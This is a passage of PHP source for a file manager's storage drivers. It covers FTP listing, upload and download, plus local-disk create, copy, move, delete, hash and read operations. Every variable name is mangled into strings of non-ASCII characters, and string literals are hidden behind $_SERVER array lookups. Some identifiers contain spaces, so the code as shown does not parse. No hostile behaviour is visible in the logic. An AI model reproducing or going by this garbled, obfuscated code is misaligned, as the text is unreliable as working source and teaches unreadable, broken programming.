$this->pathThis($’’î’Ù), $¥†×€“[94] => $this->getPathOuter($¥†×€“[8] . $’’î’Ù), $¥†×€“[43] => $¥†×€“[85]); if ($èŒÏîìï) { return $§ØãÌ³œ; } $§ØãÌ³œ[$¥†×€“[225]] = $§ØãÌ³œ[$¥†×€“[95]] = 0; $§ØãÌ³œ[$¥†×€“[226]] = $§ØãÌ³œ[$¥†×€“[227]] = !0; return $§ØãÌ³œ; } private function fileInfo($ƒ‚Œü•’, $ü°áŸŠı = false, $Ğé ×õª = array()) { $™·ùœ¡ =& $_SERVER[‚ûòÉ˜ş]; $ˆØ—±Šú = array($™·ùœ¡[42] => $this->pathThis($ƒ‚Œü•’), $™·ùœ¡[94] => $this->getPathOuter($™·ùœ¡[8] . $ƒ‚Œü•’), $™·ùœ¡[43] => $™·ùœ¡[224], $™·ùœ¡[86] => isset($Ğé ×õª[$™·ùœ¡[86]]) ? $Ğé ×õª[$™·ùœ¡[86]] : 0, $™·ùœ¡[185] => $this->ext($ƒ‚Œü•’)); if ($ü°áŸŠı) { return $ˆØ—±Šú; } $ˆØ—±Šú[$™·ùœ¡[225]] = $ˆØ—±Šú[$™·ùœ¡[95]] = 0; $ˆØ—±Šú[$™·ùœ¡[226]] = $ˆØ—±Šú[$™·ùœ¡[227]] = !0; $“¤Š“Ş¡ = $this->iconvSystem($ƒ‚Œü•’); $ˆØ—±Šú[$™·ùœ¡[95]] = @ftp_mdtm($this->connect, $“¤Š“Ş¡); if (empty($Ğé ×õª)) { $Ğé ×õª = $this->objectMeta($ƒ‚Œü•’); if (!$Ğé ×õª) { return $ˆØ—±Šú; } } $ˆØ—±Šú[$™·ùœ¡[86]] = $Ğé ×õª[$™·ùœ¡[86]]; return $ˆØ—±Šú; } public function size($§†Ñ‰µë) { $¥›’Íà« = $this->objectMeta($§†Ñ‰µë); return $¥›’Íà« ? $¥›’Íà«[$_SERVER[‚ûòÉ˜ş][86]] : 0; } public function info($âØÀüŒ³) { if ($this->isFile($âØÀüŒ³)) { return $this->fileInfo($âØÀüŒ³, 0); } else { if ($this->isFolder($âØÀüŒ³)) { return $this->folderInfo($âØÀüŒ³); } } return !1; } private function fileList($òÑ„²·, &$ó¶ÉİÌ£, &$İÊ¨ÁÒ´, $£›Í™íÊ = false) { $µŠÈ£“” =& $_SERVER[‚ûòÉ˜ş]; $òÑ„²· = $this->iconvSystem($òÑ„²·); if (!$this->isFolder($òÑ„²·)) { return !1; } @ftp_chdir($this->connect, $µŠÈ£“”[8]); $òÑ„²· = rtrim($òÑ„²·, $µŠÈ£“”[8]) . $µŠÈ£“”[8]; check_abort(); $Ñòù»« = @ftp_rawlist($this->connect, $òÑ„²·); if (!$Ñòù»«) { $Ñòù»« = array(); } $ÓÊ¦¼™û = array($µŠÈ£“”[10] => 1, $µŠÈ£“”[1319] => 1); foreach ($Ñòù»« as $¡Õœ­ª) { $®óøôº™ = $this->_listItem($¡Õœ­ª); if ($®óøôº™[0] == $µŠÈ£“”[798]) { continue; } $ñ£ìş‘‡ = $®óøôº™[8]; if (empty($ñ£ìş‘‡) && $ñ£ìş‘‡ !== $µŠÈ£“”[222] || isset($ÓÊ¦¼™û[$ñ£ìş‘‡])) { continue; } $ñ£ìş‘‡ = $this->iconvApp($òÑ„²· . ltrim($ñ£ìş‘‡, $µŠÈ£“”[8])); $‘˜º¤óˆ = array($µŠÈ£“”[42] => $ñ£ìş‘‡, $µŠÈ£“”[43] => $µŠÈ£“”[224], $µŠÈ£“”[86] => $®óøôº™[4]); if (substr($¡Õœ­ª, 0, 1) == $µŠÈ£“”[1401]) { $‘˜º¤óˆ[$µŠÈ£“”[43]] = $µŠÈ£“”[85]; $‘˜º¤óˆ[$µŠÈ£“”[86]] = 0; } $¦ÛÒÅ²‚ = $‘˜º¤óˆ[$µŠÈ£“”[43]] == $µŠÈ£“”[85] ? !0 : !1; $this->cacheMethodInfoSet($ñ£ìş‘‡, $¦ÛÒÅ²‚, $‘˜º¤óˆ); if ($¦ÛÒÅ²‚) { $ó¶ÉİÌ£[] = $ñ£ìş‘‡; if ($£›Í™íÊ) { $this->fileList($ñ£ìş‘‡, $ó¶ÉİÌ£, $İÊ¨ÁÒ´, $£›Í™íÊ); } continue; } $İÊ¨ÁÒ´[] = $‘˜º¤óˆ; } $this->cacheMethodInfoSet($òÑ„²·, !0); } private function _listItem($Ôæ›’ ¬) { if (empty($Ôæ›’ ¬)) { return array(); } $Û‚ÀÆ¨™ = preg_split($_SERVER[‚ûòÉ˜ş][1402], $Ôæ›’ ¬); if (count($Û‚ÀÆ¨™) <= 9) { return $Û‚ÀÆ¨™; } $Û‚ÀÆ¨™[8] = trim(substr($Ôæ›’ ¬, strpos($Ôæ›’ ¬, $Û‚ÀÆ¨™[7]) + strlen($Û‚ÀÆ¨™[7]))); return array_splice($Û‚ÀÆ¨™, 0, 9); } public function listPath($ãò®üÅû, $»—¯È¡ = false) { $–ÁèŠºÑ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->_isconn()) { return !1; } $†€å­×ı = $ààÅÎ½® = array(); $this->fileList($ãò®üÅû, $†€å­×ı, $ààÅÎ½®); foreach ($†€å­×ı as $Ø§ª¬Èƒ => $ºöş¬Ó) { $†€å­×ı[$Ø§ª¬Èƒ] = $this->folderInfo($ºöş¬Ó, $»—¯È¡); } foreach ($ààÅÎ½® as $Ø§ª¬Èƒ => $ºöş¬Ó) { $ààÅÎ½®[$Ø§ª¬Èƒ] = $this->fileInfo($ºöş¬Ó[$–ÁèŠºÑ[42]], $»—¯È¡, $ºöş¬Ó); } return array($–ÁèŠºÑ[92] => $†€å­×ı, $–ÁèŠºÑ[93] => $ààÅÎ½®); } public function has($’˜Æ”ö, $ÀÕòÍÜ = false, $Ú¿§Ä› = true) { $±é²øß¬ =& $_SERVER[‚ûòÉ˜ş]; $ŸÔõĞº = $äÅƒÑ£ = array(); $Ñ¡Å¡¹— = $ÀÕòÍÜ ? !0 : !1; $this->fileList($’˜Æ”ö, $ŸÔõĞº, $äÅƒÑ£, $Ñ¡Å¡¹—); if ($ÀÕòÍÜ) { return array($±é²øß¬[233] => count($äÅƒÑ£), $±é²øß¬[234] => count($ŸÔõĞº)); } if ($Ú¿§Ä›) { if (count($äÅƒÑ£)) { return !0; } } else { if (count($ŸÔõĞº)) { return !0; } } return !1; } public function listAll($Ü¾„â¦ù) { $åÏ‰“¾Ê =& $_SERVER[‚ûòÉ˜ş]; if (!$this->_isconn()) { return !1; } $šÈÌÖøò = $­Æ´ù¦£ = array(); $this->fileList($Ü¾„â¦ù, $šÈÌÖøò, $­Æ´ù¦£, !0); $ ×ë‚Èà = array_to_keyvalue($­Æ´ù¦£, $åÏ‰“¾Ê[42]); foreach ($šÈÌÖøò as $ä§‚·ê·) { if (is_string($ä§‚·ê·)) { $ ×ë‚Èà[$ä§‚·ê·] = array($åÏ‰“¾Ê[86] => 0); } } return $this->listAllFiles($Ü¾„â¦ù, $ ×ë‚Èà); } public function getContent($êûæ‘€Ÿ) { if (!$this->_isconn()) { return !1; } $êûæ‘€Ÿ = $this->iconvSystem($êûæ‘€Ÿ); return $this->fileSubstr($êûæ‘€Ÿ); } public function setContent($ø¥ßÉ¨Ä, $ÑÉ°‹½ò = '') { if (!$this->_isconn()) { return !1; } $òŒà¡½¼ = $this->pathThis($this->iconvSystem($ø¥ßÉ¨Ä)); $øÍÁæÍ­ = $this->tempFile($òŒà¡½¼); file_put_contents($øÍÁæÍ­, $ÑÉ°‹½ò); $ÈÂ€Š÷¯ = $this->upload($ø¥ßÉ¨Ä, $this->iconvApp($øÍÁæÍ­)); $this->tempFileRemve($øÍÁæÍ­); return $ÈÂ€Š÷¯; } public function fileSubstr($©‘à×µ, $Ö¢ëÈÄõ = 0, $·ğÂ³Ô‹ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($©‘à×µ, $Ö¢ëÈÄõ, $·ğÂ³Ô‹); } private function ftpRequest($Û‹“µ¨ş, $ş®ÒÀø = 0, $»…ì…ôÒ = false) { $Û‹“µ¨ş = $this->iconvSystem($Û‹“µ¨ş); $¾¬½Á³ = $this->scheme . $this->host . $_SERVER[‚ûòÉ˜ş][4] . $this->port; $âØ×Ìšª = curl_init(); curl_setopt($âØ×Ìšª, CURLOPT_URL, $¾¬½Á³ . $this->pathEncode($Û‹“µ¨ş)); curl_setopt($âØ×Ìšª, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($»…ì…ôÒ) { $âœ —Üƒ = $ş®ÒÀø + $»…ì…ôÒ - 1; curl_setopt($âØ×Ìšª, CURLOPT_RANGE, "{$ş®ÒÀø}\55{$âœ —Üƒ}"); } curl_setopt($âØ×Ìšª, CURLOPT_RETURNTRANSFER, 1); $¿ÊÇÎèœ = curl_exec($âØ×Ìšª); curl_close($âØ×Ìšª); return $¿ÊÇÎèœ; } public function upload($š •Ûİ¹, $ŒÜ”Äô, $«¤å¨¯ì = false, $´…¸Æ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($š •Ûİ¹))) { return !1; } $š •Ûİ¹ = $this->iconvSystem($š •Ûİ¹); $ŒÜ”Äô = $this->iconvSystem($ŒÜ”Äô); $îĞü¤²’ = ftp_nb_put($this->connect, $š •Ûİ¹, $ŒÜ”Äô, FTP_BINARY); while ($îĞü¤²’ == FTP_MOREDATA) { $îĞü¤²’ = ftp_nb_continue($this->connect); } if ($îĞü¤²’ != FTP_FINISHED) { return !1; } return $this->getPathOuter($š •Ûİ¹); } public function download($ª¨Ü»Èç, $ç×Æ£¬† = '') { if (!$this->_isconn()) { return !1; } $ö‚ô›À’ = $this->pathFather($ç×Æ£¬†); if (!IO::mkdir($ö‚ô›À’)) { return !1; } $ª¨Ü»Èç = $this->iconvSystem($ª¨Ü»Èç); $ç×Æ£¬† = $this->iconvSystem($ç×Æ£¬†); $ø­ı­‰¢ = ftp_nb_get($this->connect, $ç×Æ£¬†, $ª¨Ü»Èç, FTP_BINARY); while ($ø­ı­‰¢ == FTP_MOREDATA) { $ø­ı­‰¢ = ftp_nb_continue($this->connect); } if ($ø­ı­‰¢ != FTP_FINISHED) { return !1; } return $this->iconvApp($ç×Æ£¬†); } public function exist($²¢èÜ†ì) { return $this->isFile($²¢èÜ†ì) || $this->isFolder($²¢èÜ†ì); } public function isFile($ÛïŒŞ·«) { return !$this->isFolder($ÛïŒŞ·«) && $this->objectMeta($ÛïŒŞ·«); } public function isFolder($îà”µ»¹) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][176], $îà”µ»¹); } protected function objectMeta($Å¢´¡‘Ä) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][178], $Å¢´¡‘Ä); } protected function _objectMeta($¹êŠ¸×‹) { $ÓƒõÃ’ =& $_SERVER[‚ûòÉ˜ş]; if ($¹êŠ¸×‹ == $ÓƒõÃ’[12] || $¹êŠ¸×‹ == $ÓƒõÃ’[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¹êŠ¸×‹ = $this->iconvSystem($¹êŠ¸×‹); $€ßşĞ¢Ê = array($ÓƒõÃ’[42] => $this->iconvApp($¹êŠ¸×‹), $ÓƒõÃ’[43] => $ÓƒõÃ’[224], $ÓƒõÃ’[86] => 0); @ftp_chdir($this->connect, $ÓƒõÃ’[8]); $¤´íÕ­õ = @ftp_size($this->connect, $¹êŠ¸×‹); if ($¤´íÕ­õ != -1) { $€ßşĞ¢Ê[$ÓƒõÃ’[86]] = $¤´íÕ­õ; } else { $±ïçÓ£ = @ftp_chdir($this->connect, $¹êŠ¸×‹); if (!$±ïçÓ£) { return !1; } $€ßşĞ¢Ê[$ÓƒõÃ’[43]] = $ÓƒõÃ’[85]; } return $€ßşĞ¢Ê; } protected function _isFolder($¼µØ·ËÒ) { $àµ÷ú›º =& $_SERVER[‚ûòÉ˜ş]; if ($¼µØ·ËÒ == $àµ÷ú›º[12] || $¼µØ·ËÒ == $àµ÷ú›º[8]) { return !0; } $“®ŒîŒ = $this->_objectMeta($¼µØ·ËÒ); return isset($“®ŒîŒ[$àµ÷ú›º[43]]) && $“®ŒîŒ[$àµ÷ú›º[43]] == $àµ÷ú›º[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($×Ğú–Ë­) { if (substr($×Ğú–Ë­, 0, 2) == $_SERVER[‚ûòÉ˜ş][1394]) { $×Ğú–Ë­ = BASIC_PATH . substr($×Ğú–Ë­, 2); } return $×Ğú–Ë­; } public function iconvApp($”™£š£©) { $èğ´æûô =& $_SERVER[‚ûòÉ˜ş]; global $config; return $this->iconvTo($”™£š£©, $config[$èğ´æûô[1392]], $config[$èğ´æûô[1391]]); } public function iconvSystem($ŠéİŠÙ) { $êŠüƒÄÎ =& $_SERVER[‚ûòÉ˜ş]; global $config; return $this->iconvTo($ŠéİŠÙ, $config[$êŠüƒÄÎ[1391]], $config[$êŠüƒÄÎ[1392]]); } public function getPathOuter($óÓ·œ) { $àğï´ú› =& $_SERVER[‚ûòÉ˜ş]; $ÈÃ›öº = $this->iconvApp($this->pathBase); $óÓ·œ = $this->iconvApp($óÓ·œ); if (substr($ÈÃ›öº, 0, 2) == $àğï´ú›[1394]) { $ÈÃ›öº = BASIC_PATH . substr($ÈÃ›öº, 2); } if (substr($óÓ·œ, 0, 2) == $àğï´ú›[1394]) { $óÓ·œ = BASIC_PATH . substr($óÓ·œ, 2); } $ÈÃ›öº = KodIO::clear($ÈÃ›öº); $óÓ·œ = KodIO::clear($óÓ·œ); $óÓ·œ = substr($óÓ·œ, strlen($ÈÃ›öº)); if (empty($this->pathDriver)) { return $óÓ·œ; } return $this->pathDriver . $àğï´ú›[8] . ltrim($óÓ·œ, $àğï´ú›[8]); } public function mkfile($§ü´ùÂæ, $·üŞÊÈ· = '', $¿ÚŠµ ò = REPEAT_RENAME) { $§ü´ùÂæ = $this->iconvSystem($§ü´ùÂæ); @touch($§ü´ùÂæ); if ($·üŞÊÈ·) { file_put_contents($§ü´ùÂæ, $·üŞÊÈ·); } @chmod($§ü´ùÂæ, $this->pathAuth); return is_file($§ü´ùÂæ) ? $this->getPathOuter($§ü´ùÂæ) : !1; } public function mkdir($Ÿµü¹ƒ , $ÌŠßªõ¥ = REPEAT_SKIP) { $Ÿµü¹ƒ  = $this->iconvSystem($Ÿµü¹ƒ ); if (is_dir($Ÿµü¹ƒ )) { return $this->getPathOuter($Ÿµü¹ƒ ); } @mkdir($Ÿµü¹ƒ , $this->pathAuth, !0); @chmod($Ÿµü¹ƒ , $this->pathAuth); return is_dir($Ÿµü¹ƒ ) ? $this->getPathOuter($Ÿµü¹ƒ ) : !1; } public function copyFile($û•åŞæê, $²°åì‹á) { $this->mkdir($this->pathFather($²°åì‹á)); $û•åŞæê = $this->iconvSystem($û•åŞæê); $²°åì‹á = $this->iconvSystem($²°åì‹á); $•å·³ó = copy_64($û•åŞæê, $²°åì‹á); @chmod($²°åì‹á, $this->pathAuth); return $•å·³ó ? $this->getPathOuter($²°åì‹á) : !1; } public function moveFile($şöä¦’™, $şêĞ”©‚) { $this->mkdir($this->pathFather($şêĞ”©‚)); $şöä¦’™ = $this->iconvSystem($şöä¦’™); $şêĞ”©‚ = $this->iconvSystem($şêĞ”©‚); $Â–†³ş¸ = intval(@rename($şöä¦’™, $şêĞ”©‚)); if (!$Â–†³ş¸) { if ($Â–†³ş¸ = intval(@copy_64($şöä¦’™, $şêĞ”©‚))) { @unlink($şöä¦’™); } } @chmod($şêĞ”©‚, $this->pathAuth); return $Â–†³ş¸ ? $this->getPathOuter($şêĞ”©‚) : !1; } public function movePath($²õ¯øüú, $´ÒşİœØ, $ÎƒËì¸ = false) { $Ïş‹ÓÑ =& $_SERVER[‚ûòÉ˜ş]; $²õ¯øüú = $this->iconvSystem($²õ¯øüú); $´ÒşİœØ = $this->iconvSystem($´ÒşİœØ); $ìáø¬¿Á = rtrim($´ÒşİœØ, $Ïş‹ÓÑ[8]) . $Ïş‹ÓÑ[8] . ($ÎƒËì¸ ? $ÎƒËì¸ : get_path_this($²õ¯øüú)); if (file_exists($ìáø¬¿Á)) { return !1; } $Ç‘€²Ş” = intval(@rename($²õ¯øüú, $ìáø¬¿Á)); $Ç‘€²Ş” = file_exists($ìáø¬¿Á); return $Ç‘€²Ş” ? $this->getPathOuter($ìáø¬¿Á) : !1; } public function delFile($·Ã”ÜÓ) { $·Ã”ÜÓ = $this->iconvSystem($·Ã”ÜÓ); if (!@unlink($·Ã”ÜÓ)) { @chmod($·Ã”ÜÓ, $this->pathAuth); if (!@unlink($·Ã”ÜÓ)) { return !1; } } else { return !0; } } public function delFolder($Œ¨Àçïä) { $ÏÆš·¶ =& $_SERVER[‚ûòÉ˜ş]; $Œ¨Àçïä = $this->iconvSystem($Œ¨Àçïä); if (!is_dir($Œ¨Àçïä)) { return !0; } if (!($œ¡Šõ‘ = opendir($Œ¨Àçïä))) { return !1; } while (($ôöà•Ÿ£ = readdir($œ¡Šõ‘)) !== !1) { if ($ôöà•Ÿ£ == $ÏÆš·¶[10] || $ôöà•Ÿ£ == $ÏÆš·¶[1319]) { continue; } $Û­µÜŒş = $Œ¨Àçïä . $ÏÆš·¶[8] . $ôöà•Ÿ£; if (is_file($Û­µÜŒş) || is_link($Û­µÜŒş)) { if (!unlink($Û­µÜŒş)) { chmod($Û­µÜŒş, $this->pathAuth); if (!unlink($Û­µÜŒş)) { return !1; } } } else { if (is_dir($Û­µÜŒş)) { chmod($Û­µÜŒş, $this->pathAuth); $Û­µÜŒş = $this->iconvApp($Û­µÜŒş); if (!$this->delFolder($Û­µÜŒş)) { return !1; } } } } closedir($œ¡Šõ‘); return rmdir($Œ¨Àçïä); } public function rename($ä«øÀ­Ã, $ôœ²’») { $šá‹Í‚¤ =& $_SERVER[‚ûòÉ˜ş]; $™î‹™â´ = $this->fileNameAuto($this->pathFather($ä«øÀ­Ã), $ôœ²’»); $™î‹™â´ = $this->iconvSystem($™î‹™â´); $ä«øÀ­Ã = $this->iconvSystem($ä«øÀ­Ã); $êÚİÇéè = $this->pathFather($ä«øÀ­Ã); $ÁÊûİäÈ = rtrim($êÚİÇéè, $šá‹Í‚¤[8]) . $šá‹Í‚¤[8] . $™î‹™â´; $³÷¿‚¸ƒ = @rename($ä«øÀ­Ã, $ÁÊûİäÈ); $ÁÊûİäÈ = $this->iconvApp($ÁÊûİäÈ); return $³÷¿‚¸ƒ ? $this->getPathOuter($ÁÊûİäÈ) : !1; } public function size($”Ğ„Á£Ô) { $”Ğ„Á£Ô = $this->iconvSystem($”Ğ„Á£Ô); return filesize_64($”Ğ„Á£Ô); } public function info($ÛˆáĞò…) { $ÛˆáĞò… = $this->iconvSystem($ÛˆáĞò…); if ($this->isFolder($ÛˆáĞò…)) { return $this->folderInfo($ÛˆáĞò…); } else { if ($this->isFile($ÛˆáĞò…)) { return $this->fileInfo($ÛˆáĞò…); } } return !1; } protected function infoChildren($Û€¬“ş, &$ñÎíÀûñ, $˜Çò¬ì„ = true) { $§Œ¼šâ =& $_SERVER[‚ûòÉ˜ş]; check_abort_echo(); $Û€¬“ş = rtrim($Û€¬“ş, $§Œ¼šâ[8]) . $§Œ¼šâ[8]; if ($˜Çò¬ì„) { $Û€¬“ş = $this->iconvSystem($Û€¬“ş); } if (!($ä¶Òãëõ = @opendir($Û€¬“ş))) { return; } while (($àåşùğ = readdir($ä¶Òãëõ)) !== !1) { if ($àåşùğ == $§Œ¼šâ[10] || $àåşùğ == $§Œ¼šâ[1319]) { continue; } $µ«ñÇ€ = $Û€¬“ş . $àåşùğ; if (is_file($µ«ñÇ€) || is_link($µ«ñÇ€)) { $ñÎíÀûñ[$§Œ¼šâ[87]]++; $ñÎíÀûñ[$§Œ¼šâ[86]] += filesize_64($µ«ñÇ€); } else { if (is_dir($µ«ñÇ€)) { $ñÎíÀûñ[$§Œ¼šâ[88]]++; $this->infoChildren($µ«ñÇ€, $ñÎíÀûñ, !1); } } } closedir($ä¶Òãëõ); } private function folderInfo($¦Ş¾øí‡, $Ü¶«ÁÔ¾ = false) { $Œ÷¥³â• =& $_SERVER[‚ûòÉ˜ş]; $¦Ş¾øí‡ = rtrim($¦Ş¾øí‡, $Œ÷¥³â•[8]) . $Œ÷¥³â•[8]; $—‘ı‡ = $this->iconvApp($this->pathThis($¦Ş¾øí‡)); if ($Ü¶«ÁÔ¾) { return array($Œ÷¥³â•[42] => $—‘ı‡, $Œ÷¥³â•[94] => $this->getPathOuter($¦Ş¾øí‡), $Œ÷¥³â•[43] => $Œ÷¥³â•[85]); } $…µ²èÁ¡ = array($Œ÷¥³â•[42] => $—‘ı‡, $Œ÷¥³â•[94] => $this->getPathOuter($¦Ş¾øí‡), $Œ÷¥³â•[43] => $Œ÷¥³â•[85], $Œ÷¥³â•[225] => @filectime($¦Ş¾øí‡), $Œ÷¥³â•[95] => @filemtime($¦Ş¾øí‡), $Œ÷¥³â•[1403] => @fileatime($¦Ş¾øí‡), $Œ÷¥³â•[1404] => is_readable($¦Ş¾øí‡), $Œ÷¥³â•[1405] => is_writable($¦Ş¾øí‡), $Œ÷¥³â•[1406] => get_mode($¦Ş¾øí‡)); return $…µ²èÁ¡; } private function fileInfo($ŞºĞÊš, $ú³Ö¾¶ = false) { $ƒ’£®ñ =& $_SERVER[‚ûòÉ˜ş]; $Û¬ÚÔ¶ï = $this->iconvApp($this->pathThis($ŞºĞÊš)); if ($ú³Ö¾¶) { return array($ƒ’£®ñ[42] => $Û¬ÚÔ¶ï, $ƒ’£®ñ[94] => $this->getPathOuter($ŞºĞÊš), $ƒ’£®ñ[43] => $ƒ’£®ñ[224], $ƒ’£®ñ[86] => $this->size($ŞºĞÊš), $ƒ’£®ñ[185] => $this->ext($Û¬ÚÔ¶ï)); } $ëš¹¥†§ = array($ƒ’£®ñ[42] => $Û¬ÚÔ¶ï, $ƒ’£®ñ[94] => $this->getPathOuter($ŞºĞÊš), $ƒ’£®ñ[43] => $ƒ’£®ñ[224], $ƒ’£®ñ[225] => @filectime($ŞºĞÊš), $ƒ’£®ñ[95] => @filemtime($ŞºĞÊš), $ƒ’£®ñ[1403] => @fileatime($ŞºĞÊš), $ƒ’£®ñ[86] => $this->size($ŞºĞÊš), $ƒ’£®ñ[185] => $this->ext($Û¬ÚÔ¶ï), $ƒ’£®ñ[1404] => is_readable($ŞºĞÊš), $ƒ’£®ñ[1405] => is_writable($ŞºĞÊš), $ƒ’£®ñ[1406] => get_mode($ŞºĞÊš)); return $ëš¹¥†§; } public function exist($ÛƒŒœçá) { $ÛƒŒœçá = $this->iconvSystem($ÛƒŒœçá); return @file_exists($ÛƒŒœçá); } public function isFile($Œ€½üÄ‡) { $Œ€½üÄ‡ = $this->iconvSystem($Œ€½üÄ‡); return @is_file($Œ€½üÄ‡); } public function isFolder($õàµª‹) { $õàµª‹ = $this->iconvSystem($õàµª‹); return @is_dir($õàµª‹); } public function listPath($èù˜”œÇ, $«ŠÃ”î¢ = false) { $âö ì„ğ =& $_SERVER[‚ûòÉ˜ş]; $èù˜”œÇ = $this->iconvSystem($èù˜”œÇ); $èù˜”œÇ = rtrim($èù˜”œÇ, $âö ì„ğ[8]) . $âö ì„ğ[8]; $†¨Ò³” = array($âö ì„ğ[92] => array(), $âö ì„ğ[93] => array()); if (!($äÉãì¬Ì = @opendir($èù˜”œÇ))) { return $†¨Ò³”; } while (($¦â¢›ú = readdir($äÉãì¬Ì)) !== !1) { if ($¦â¢›ú == $âö ì„ğ[10] || $¦â¢›ú == $âö ì„ğ[1319]) { continue; } $•ÆÂå¸ä = $èù˜”œÇ . $¦â¢›ú; if (is_file($•ÆÂå¸ä)) { $†¨Ò³”[$âö ì„ğ[93]][] = $this->fileInfo($•ÆÂå¸ä, $«ŠÃ”î¢); } else { $†¨Ò³”[$âö ì„ğ[92]][] = $this->folderInfo($•ÆÂå¸ä, $«ŠÃ”î¢); } } closedir($äÉãì¬Ì); return $†¨Ò³”; } public function listAll($³à‰œÛ, &$ùİŒ®€Œ = array()) { $éê·„Û¸ =& $_SERVER[‚ûòÉ˜ş]; $³à‰œÛ = $this->iconvSystem($³à‰œÛ); $³à‰œÛ = rtrim($³à‰œÛ, $éê·„Û¸[8]) . $éê·„Û¸[8]; if (!($¼à›ÆÔÃ = @opendir($³à‰œÛ))) { return $ùİŒ®€Œ; } while (($ÙŞÄøÊû = readdir($¼à›ÆÔÃ)) !== !1) { if ($ÙŞÄøÊû == $éê·„Û¸[10] || $ÙŞÄøÊû == $éê·„Û¸[1319]) { continue; } $ÑøÒû¡ = $³à‰œÛ . $ÙŞÄøÊû; $³Óüí¦½ = is_dir($ÑøÒû¡) && !is_link($ÑøÒû¡) ? 1 : 0; $ÑøÒû¡ = $³Óüí¦½ ? $ÑøÒû¡ . $éê·„Û¸[8] : $ÑøÒû¡; $ùİŒ®€Œ[] = array($éê·„Û¸[94] => $ÑøÒû¡, $éê·„Û¸[85] => $³Óüí¦½, $éê·„Û¸[95] => intval(@filemtime($ÑøÒû¡)), $éê·„Û¸[86] => $³Óüí¦½ ? 0 : intval($this->size($ÑøÒû¡))); if ($³Óüí¦½) { $this->listAll($ÑøÒû¡, $ùİŒ®€Œ); } } closedir($¼à›ÆÔÃ); return $ùİŒ®€Œ; } public function has($ò—æ©ì, $‹×»›¸í = false, $Øšéã…® = true) { $»û¶¡ãÑ =& $_SERVER[‚ûòÉ˜ş]; $ò—æ©ì = $this->iconvSystem($ò—æ©ì); $ò—æ©ì = rtrim($ò—æ©ì, $»û¶¡ãÑ[8]) . $»û¶¡ãÑ[8]; if (!($ş‘î“ı = @opendir($ò—æ©ì))) { return !1; } $¹¤äÎ÷ì = 0; $…æÀ£ìô = 0; $ßİ±¡Šò = 0; while (($ü¹’Ã“ï = readdir($ş‘î“ı)) !== !1) { if ($ü¹’Ã“ï == $»û¶¡ãÑ[10] || $ü¹’Ã“ï == $»û¶¡ãÑ[1319]) { continue; } $Ø‡ùŠ’ä = $ò—æ©ì . $ü¹’Ã“ï; if ($‹×»›¸í) { $ßİ±¡Šò++; if (@is_file($Ø‡ùŠ’ä)) { $¹¤äÎ÷ì++; } else { $…æÀ£ìô++; } if ($ßİ±¡Šò > 10000) { break; } continue; } if ($Øšéã…®) { if (@is_file($Ø‡ùŠ’ä)) { return !0; } } else { if (@is_dir($Ø‡ùŠ’ä . $»û¶¡ãÑ[8])) { return !0; } } } closedir($ş‘î“ı); if ($‹×»›¸í) { return array($»û¶¡ãÑ[233] => $¹¤äÎ÷ì, $»û¶¡ãÑ[234] => $…æÀ£ìô); } return !1; } public function hashSimple($¹´íİïÁ) { $ãÖ‰ß®Ù =& $_SERVER[‚ûòÉ˜ş]; if (!$¹´íİïÁ) { return md5($ãÖ‰ß®Ù[12]); } $¹´íİïÁ = $this->iconvSystem($¹´íİïÁ); $©¦¯–¡ = $this->size($¹´íİïÁ); $šÜã°Œ· = 200; $´Ó£¨Ì = 50; if ($©¦¯–¡ <= $šÜã°Œ· * $´Ó£¨Ì) { return $this->hashMd5($¹´íİïÁ) . $©¦¯–¡; } $áïÎ‚ÅĞ = $ãÖ‰ß®Ù[12]; $ïµğ‚ï = intval($©¦¯–¡ / $´Ó£¨Ì); $ø“Íò¸Ø = fopen($¹´íİïÁ, $ãÖ‰ß®Ù[1407]); if (!$ø“Íò¸Ø) { return $áïÎ‚ÅĞ; } for ($©äã¬­ = 0; $©äã¬­ < $´Ó£¨Ì; $©äã¬­++) { fseek_64($ø“Íò¸Ø, $ïµğ‚ï * $©äã¬­); $áïÎ‚ÅĞ .= fread($ø“Íò¸Ø, $šÜã°Œ·); } fseek_64($ø“Íò¸Ø, $©¦¯–¡ - $šÜã°Œ·); $áïÎ‚ÅĞ .= fread($ø“Íò¸Ø, $šÜã°Œ·); fclose($ø“Íò¸Ø); return md5($áïÎ‚ÅĞ) . $©¦¯–¡; } public function getContent($Û÷´ğ´) { $Û÷´ğ´ = $this->iconvSystem($Û÷´ğ´); return file_get_contents($Û÷´ğ´); } public function setContent($å°ú£Ç‹, $‹½èñéì = '') { $å°ú£Ç‹ = $this->iconvSystem($å°ú£Ç‹); $ÑØàı = @file_put_contents($å°ú£Ç‹, $‹½èñéì, LOCK_EX); clearstatcache(); @chmod($å°ú£Ç‹, $this->pathAuth); return $ÑØàı === !1 ? !1 : !0; } public function fileSubstr($®¿œí´Å, $¾Ğ¥ª¼ñ = 0, $‰ş˜ÖÁÛ = false) { $ş°ûËº =& $_SERVER[‚ûòÉ˜ş]; $®¿œí´Å = $this->iconvSystem($®¿œí´Å); if ($‰ş˜ÖÁÛ === !1) { $‰ş˜ÖÁÛ = $this->size($®¿œí´Å); } if ($‰ş˜ÖÁÛ <= 0) { return $ş°ûËº[12]; } $ŠìÇØâ = fopen($®¿œí´Å, $ş°ûËº[1407]); if (!$ŠìÇØâ) { return !1; } fseek_64($ŠìÇØâ, $¾Ğ¥ª¼ñ); $³äÄñøá = fread($ŠìÇØâ, $‰ş˜ÖÁÛ); fclose($ŠìÇØâ); return $³äÄñøá; } public function upload($‰«õÅ¦º, $ĞÉêÔû, $ÜÄä‹¬Î = false, $ëÒ‘¡¬€ = REPEAT_REPLACE) { if ($ÜÄä‹¬Î) { return $this->moveFile($ĞÉêÔû, $‰«õÅ¦º); } return $this->copyFile($ĞÉêÔû, $‰«õÅ¦º); } public function setModifyTime($Ğ”¸ºœ, $Ã®¶ş = '') { @touch($Ğ”¸ºœ, intval($Ã®¶ş)); } public function download($Ò‘Çú•, $”Â¹Ñ›÷) { return $this->iconvSystem($Ò‘Çú•); } } class PathDriverOOS extends PathDriverBaseS3 { public function 